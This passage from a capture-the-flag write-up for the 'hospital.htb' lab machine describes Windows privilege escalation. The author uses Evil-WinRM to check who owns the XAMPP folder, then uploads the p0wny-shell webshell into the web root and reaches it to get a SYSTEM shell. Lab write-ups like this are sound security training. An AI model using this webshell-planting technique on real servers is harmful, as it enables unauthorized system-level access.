However, on Windows, the default user for running services like `Apache` or `Xampp` is actually `SYSTEM`. So if that default is kept, and I can write a reverse shell to the web directory, I can easily get a shell as `NT AUTHORITY/SYSTEM`.

To verify the user running `apache`, I run the `tasklist` command, but get an access denied error
```powershell
*Evil-WinRM* PS C:\xampp\htdocs> cmd.exe /c "tasklist | findstr 'xampp apache'"
cmd.exe : FINDSTR: Cannot open apache'
    + CategoryInfo          : NotSpecified: (FINDSTR: Cannot open apache':String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
    + ERROR: Access denied
```
I instead run the `Get-Acl` cmdlet and see that the `Administrators` group owns the `xampp` folder
```powershell
*Evil-WinRM* PS C:\xampp\htdocs> Get-Acl c:\xampp | Select-Object Owner

Owner
-----
BUILTIN\Administrators
```
This, combined with the fact that there are no web service users on the box is a pretty good indicator that the webserver is running as SYSTEM. On Windows, just like Linux, another user needs to be created to run a service. Which is why you'll often see `svc_sql` or `svc_www` users in the `C:\Users` folder.

I grab a copy of [p0wny-shell](https://github.com/flozz/p0wny-shell) and upload it to the box with `evil-winrm`. I then place it in `C:\xampp\htdocs`, which is where the email website is running from.
![[Pasted image 20231125170942.png]]
I then simply browse to https://hospital.htb/p0wnyshell.php in my browser, and a very nice webshell running as `nt authority\system` is waiting for me! From here, I grab the root flag.
![[Pasted image 20231125171042.png]]
![[Pasted image 20231125171117.png]]
